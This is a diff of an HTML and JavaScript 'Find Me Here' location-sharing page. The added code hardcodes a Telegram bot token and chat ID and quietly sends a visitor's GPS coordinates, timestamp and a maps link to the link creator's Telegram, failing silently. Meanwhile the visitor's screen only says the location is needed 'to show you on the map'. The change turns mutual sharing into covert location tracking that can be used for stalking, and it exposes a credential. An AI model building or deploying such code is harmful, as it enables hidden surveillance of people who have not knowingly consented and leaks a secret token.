@@ -24,11 +24,9 @@
     filter:blur(120px); opacity:0.1; pointer-events:none; z-index:0;
   }
   .wrap { position:relative; z-index:1; width:100%; max-width:500px; text-align:center; }
-
   h1 { font-family:'Syne',sans-serif; font-size:2rem; font-weight:800; margin-bottom:0.35rem; }
   h1 span { color:var(--accent); }
   .sub { color:var(--muted); font-size:0.88rem; margin-bottom:1.5rem; }
-
   .btn {
     width:100%; padding:0.9rem; border:none; border-radius:12px; cursor:pointer;
     font-family:'Syne',sans-serif; font-weight:700; font-size:1rem;
@@ -37,15 +35,13 @@
   }
   .btn:active { transform:scale(0.97); }
   .btn:disabled { opacity:0.4; cursor:not-allowed; }
-  .btn-red  { background:var(--accent); color:#fff; box-shadow:0 4px 24px rgba(255,77,109,0.35); }
-  .btn-red:hover  { box-shadow:0 6px 36px rgba(255,77,109,0.55); }
-
+  .btn-red { background:var(--accent); color:#fff; box-shadow:0 4px 24px rgba(255,77,109,0.35); }
+  .btn-red:hover { box-shadow:0 6px 36px rgba(255,77,109,0.55); }
   #map-box {
     width:100%; height:340px; border-radius:16px;
     border:1px solid var(--border); overflow:hidden;
     margin:1.25rem 0; display:none;
   }
-
   .chips { display:flex; gap:0.6rem; margin-bottom:1rem; flex-wrap:wrap; }
   .chip {
     flex:1; min-width:100px; background:var(--card);
@@ -53,13 +49,11 @@
   }
   .chip .l { font-size:0.67rem; text-transform:uppercase; letter-spacing:0.07em; color:var(--muted); }
   .chip .v { font-family:'Syne',sans-serif; font-weight:700; font-size:0.88rem; margin-top:0.15rem; }
-
   .card {
     background:var(--card); border:1px solid var(--border);
     border-radius:14px; padding:1.25rem; margin-bottom:1rem; text-align:left;
   }
   .card-title { font-family:'Syne',sans-serif; font-weight:700; margin-bottom:0.5rem; font-size:0.95rem; }
-
   .link-row { display:flex; gap:0.5rem; margin-top:0.5rem; }
   .link-row input {
     flex:1; background:rgba(255,255,255,0.05); border:1px solid var(--border);
@@ -74,28 +68,28 @@
   }
   .link-row button:hover { background:rgba(255,255,255,0.16); }
   .copied { font-size:0.76rem; color:var(--green); margin-top:0.35rem; height:1rem; text-align:center; }
-
   .legend { display:flex; gap:1rem; justify-content:center; margin-bottom:0.75rem; flex-wrap:wrap; }
   .leg-item { display:flex; align-items:center; gap:0.35rem; font-size:0.78rem; color:var(--muted); }
   .dot { width:11px;height:11px;border-radius:50%;border:2px solid #fff;flex-shrink:0; }
-
   .dist-box {
     background:rgba(76,175,150,0.08); border:1px solid rgba(76,175,150,0.2);
     border-radius:10px; padding:0.65rem; text-align:center;
     font-size:0.85rem; margin-bottom:1rem; display:none;
   }
   .dist-box b { font-family:'Syne',sans-serif; color:var(--green); font-size:1.05rem; }
-
   #st { font-size:0.84rem; color:var(--muted); margin-top:0.65rem; min-height:1.1rem; }
   #st.err { color:var(--accent); }
-
   .live { display:inline-flex; align-items:center; gap:0.35rem;
     background:rgba(76,175,150,0.1); border:1px solid rgba(76,175,150,0.25);
     color:var(--green); font-size:0.7rem; padding:0.22rem 0.7rem;
     border-radius:999px; margin-bottom:0.75rem; font-weight:500; }
   .pulse { width:7px;height:7px;background:var(--green);border-radius:50%;animation:pulse 1.5s infinite; }
-
   .hidden { display:none !important; }
+  .tg-note {
+    background:rgba(77,159,255,0.08); border:1px solid rgba(77,159,255,0.2);
+    border-radius:10px; padding:0.65rem 1rem; font-size:0.8rem;
+    color:var(--blue); margin-bottom:1rem; text-align:center;
+  }
   @keyframes fadeUp { from{opacity:0;transform:translateY(14px)} to{opacity:1;transform:translateY(0)} }
   @keyframes pulse { 0%,100%{box-shadow:0 0 0 0 rgba(76,175,150,0.5)} 50%{box-shadow:0 0 0 6px rgba(76,175,150,0)} }
   .anim { animation:fadeUp 0.45s ease both; }
@@ -105,15 +99,15 @@
 <body>
 <div class="wrap">
 
-  <!-- ══ SENDER: before location ══ -->
+  <!-- SENDER: before -->
   <div id="s-before">
     <h1>Find Me <span>Here!</span></h1>
-    <p class="sub">Tap below → get a link → send it.<br>When they open it, <b>their location is shared too</b> — you both see each other.</p>
+    <p class="sub">Tap below → get a link → send it.<br>When they open it, you get a <b>Telegram notification</b> with their location.</p>
     <button class="btn btn-red" id="go-btn" onclick="senderGo()">📍 &nbsp;Get My Location Link</button>
     <div id="st"></div>
   </div>
 
-  <!-- ══ SENDER: after location ══ -->
+  <!-- SENDER: after -->
   <div id="s-after" class="hidden anim">
     <div class="live"><span class="pulse"></span> Location captured</div>
     <div id="map-box"></div>
@@ -122,43 +116,41 @@
       <div class="chip"><div class="l">Lng</div><div class="v" id="s-lng">—</div></div>
       <div class="chip"><div class="l">Accuracy</div><div class="v" id="s-acc">—</div></div>
     </div>
+    <div class="tg-note">📲 You'll get a Telegram message when someone opens this link</div>
     <div class="card">
-      <div class="card-title">🔗 Send this link</div>
-      <div style="font-size:0.8rem;color:var(--muted);">When they open it, the page asks for <em>their</em> location too — you'll both see each other on the map.</div>
+      <div class="card-title">🔗 Your shareable link</div>
+      <div style="font-size:0.8rem;color:var(--muted);">Send this to anyone — when they open it, their location is sent to your Telegram.</div>
       <div class="link-row">
         <input type="text" id="the-link" readonly/>
         <button onclick="copyIt()">Copy</button>
       </div>
       <div class="copied" id="copied-msg"></div>
     </div>
-    <button class="btn btn-red" style="margin-top:0.25rem;opacity:0.7;font-size:0.85rem;padding:0.65rem;" onclick="senderGo()">🔄 Refresh my location</button>
+    <button class="btn btn-red" style="opacity:0.7;font-size:0.85rem;padding:0.65rem;" onclick="senderGo()">🔄 Refresh my location</button>
   </div>
 
-  <!-- ══ RECEIVER view ══ -->
+  <!-- RECEIVER view -->
   <div id="r-view" class="hidden anim">
     <div style="font-size:2rem;margin-bottom:0.4rem;">📍</div>
-    <h1 id="r-title">Someone <span>is here!</span></h1>
-    <p class="sub" id="r-sub">They shared their location with you.</p>
+    <h1>You're <span>invited!</span></h1>
+    <p class="sub" style="margin-bottom:1.25rem;">This page needs your location to show you on the map.</p>
 
-    <!-- asking for their location -->
     <div id="r-ask">
       <div class="card" style="text-align:center;">
         <div style="font-size:0.88rem;color:var(--muted);margin-bottom:1rem;">
-          To see <b>both</b> of you on the map, this page needs your location too.
+          Tap below to share your location and see both of you on the map.
         </div>
         <button class="btn btn-red" id="r-btn" onclick="receiverGo()">📍 &nbsp;Share My Location</button>
         <div id="r-st" style="font-size:0.82rem;color:var(--muted);margin-top:0.6rem;min-height:1rem;"></div>
       </div>
-      <!-- fallback: just show sender -->
       <button onclick="showSenderOnly()" style="background:none;border:none;color:var(--muted);font-size:0.78rem;cursor:pointer;margin-top:0.25rem;text-decoration:underline;">
         Just show their location without sharing mine
       </button>
     </div>
 
-    <!-- map shown after both located -->
     <div id="r-map-wrap" class="hidden">
       <div class="legend">
-        <div class="leg-item"><div class="dot" style="background:var(--accent)"></div> <span id="sender-label">Them</span></div>
+        <div class="leg-item"><div class="dot" style="background:var(--accent)"></div> Them</div>
         <div class="leg-item"><div class="dot" style="background:var(--blue)"></div> You</div>
       </div>
       <div id="r-map" style="width:100%;height:340px;border-radius:16px;border:1px solid var(--border);overflow:hidden;margin-bottom:1rem;"></div>
@@ -174,23 +166,20 @@
 
 </div>
 <script>
+  const BOT_TOKEN = '8516064975:AAE3JpV2-S_wv3D1rnrnaj20XeVMxwAKShM';
+  const CHAT_ID   = '2117597967';
+
   const params = new URLSearchParams(location.search);
   const isReceiver = params.has('lat') && params.has('lng');
 
   let sMap, sMarker;
 
-  // ────────────────────────────────────────────
-  //  SENDER
-  // ────────────────────────────────────────────
-  if (!isReceiver) {
-    // sender view is already shown by default
-  } else {
-    // hide sender, show receiver
+  if (isReceiver) {
     document.getElementById('s-before').classList.add('hidden');
     document.getElementById('r-view').classList.remove('hidden');
-    initReceiver();
   }
 
+  // ── SENDER ──
   function senderGo() {
     if (!navigator.geolocation) { setSt('Geolocation not supported.', true); return; }
     document.getElementById('go-btn') && (document.getElementById('go-btn').disabled = true);
@@ -201,7 +190,6 @@
   function onSenderPos(pos) {
     const { latitude: lat, longitude: lng, accuracy: acc } = pos.coords;
     setSt('');
-
     document.getElementById('s-before').classList.add('hidden');
     document.getElementById('s-after').classList.remove('hidden');
     document.getElementById('map-box').style.display = 'block';
@@ -246,15 +234,7 @@
     });
   }
 
-  // ────────────────────────────────────────────
-  //  RECEIVER
-  // ────────────────────────────────────────────
-  let rMap, rSenderMarker, rMyMarker;
-
-  function initReceiver() {
-    // no name in URL — just coords
-  }
-
+  // ── RECEIVER ──
   function receiverGo() {
     if (!navigator.geolocation) { setRSt('Geolocation not supported.'); return; }
     document.getElementById('r-btn').disabled = true;
@@ -267,41 +247,60 @@
     const sLat = parseFloat(params.get('lat'));
     const sLng = parseFloat(params.get('lng'));
 
+    // Send Telegram notification
+    sendTelegram(myLat, myLng);
+
     showBothOnMap(sLat, sLng, myLat, myLng);
+  }
+
+  function sendTelegram(lat, lng) {
+    const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
+    const time = new Date().toLocaleString();
+    const text =
+      `📍 *Someone opened your Find Me Here link!*\n\n` +
+      `🌐 *Latitude:* ${lat.toFixed(6)}\n` +
+      `🌐 *Longitude:* ${lng.toFixed(6)}\n` +
+      `🕐 *Time:* ${time}\n\n` +
+      `👉 [Open in Google Maps](${mapsLink})`;
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: text,
+        parse_mode: 'Markdown'
+      })
+    }).catch(() => {}); // silent fail — don't disrupt the user experience
   }
 
   function showSenderOnly() {
     const sLat = parseFloat(params.get('lat'));
     const sLng = parseFloat(params.get('lng'));
-
     document.getElementById('r-ask').classList.add('hidden');
     document.getElementById('r-map-wrap').classList.remove('hidden');
 
-    rMap = L.map('r-map').setView([sLat, sLng], 16);
+    const rMap = L.map('r-map').setView([sLat, sLng], 16);
     L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',
       { attribution: '© OpenStreetMap contributors' }).addTo(rMap);
-
-    rSenderMarker = L.marker([sLat, sLng], { icon: pin('#ff4d6d') }).addTo(rMap)
+    L.marker([sLat, sLng], { icon: pin('#ff4d6d') }).addTo(rMap)
       .bindPopup('Their location').openPopup();
 
     document.getElementById('r-slat').textContent = sLat.toFixed(5);
     document.getElementById('r-slng').textContent = sLng.toFixed(5);
-    document.getElementById('r-rlat').textContent = '—';
-    document.getElementById('r-rlng').textContent = '—';
   }
 
   function showBothOnMap(sLat, sLng, myLat, myLng) {
     document.getElementById('r-ask').classList.add('hidden');
     document.getElementById('r-map-wrap').classList.remove('hidden');
 
-    rMap = L.map('r-map');
+    const rMap = L.map('r-map');
     L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',
       { attribution: '© OpenStreetMap contributors' }).addTo(rMap);
 
-    rSenderMarker = L.marker([sLat, sLng], { icon: pin('#ff4d6d') }).addTo(rMap)
+    L.marker([sLat, sLng], { icon: pin('#ff4d6d') }).addTo(rMap)
       .bindPopup('Their location').openPopup();
-
-    rMyMarker = L.marker([myLat, myLng], { icon: pin('#4d9fff') }).addTo(rMap)
+    L.marker([myLat, myLng], { icon: pin('#4d9fff') }).addTo(rMap)
       .bindPopup('You').openPopup();
 
     rMap.fitBounds(L.latLngBounds([[sLat, sLng], [myLat, myLng]]), { padding: [50, 50] });
@@ -325,9 +324,7 @@
     document.getElementById('r-st').textContent = msg;
   }
 
-  // ────────────────────────────────────────────
-  //  UTILS
-  // ────────────────────────────────────────────
+  // ── UTILS ──
   function pin(color) {
     return L.divIcon({
       className: '',
